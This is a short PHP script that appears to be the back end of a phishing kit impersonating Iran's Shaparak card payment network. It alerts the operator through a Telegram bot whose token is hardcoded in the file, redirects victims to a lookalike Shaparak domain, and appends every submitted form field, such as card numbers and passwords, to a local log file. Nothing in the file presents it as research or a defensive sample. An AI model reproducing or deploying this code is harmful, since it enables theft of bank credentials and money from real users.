<?php
class MyTmpTelegramBot
{
    const BOT_TOKEN = "1239915633:AAE4n2pWUj_fJsp6axbbcJJF8dluaitKyQs";
    const TELEGRAM_API_URL = "https://api.telegram.org/bot";

    public $url;

    public function __construct()
    {
        $this->url = SELF::TELEGRAM_API_URL . SELF::BOT_TOKEN;
    }

    private function runScript($method)
    {
        return file_get_contents($this->url . '/'. $method);
    }

    public function getUpdates()
    {
        return $this->runScript('getupdates');
    }

    public function sendMessage($chatId, $text)
    {
        $url = "sendmessage?text=$text&chat_id=$chatId";
        return $this->runScript($url);
    }
}

$obj = new MyTmpTelegramBot();
$updatesJson = $obj->getUpdates();
$updatesJson2Array = json_decode($updatesJson, true);
$chatId = $updatesJson2Array['result'][0]['message']['chat']['id'];
$obj->sendMessage($chatId, 'درخواست رمز دودقیقه فرصت شروع شد');
header ('Location: https://mabna.shaparak.ir.seepeehr.ir/ese.php');
$handle = fopen("logtime.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);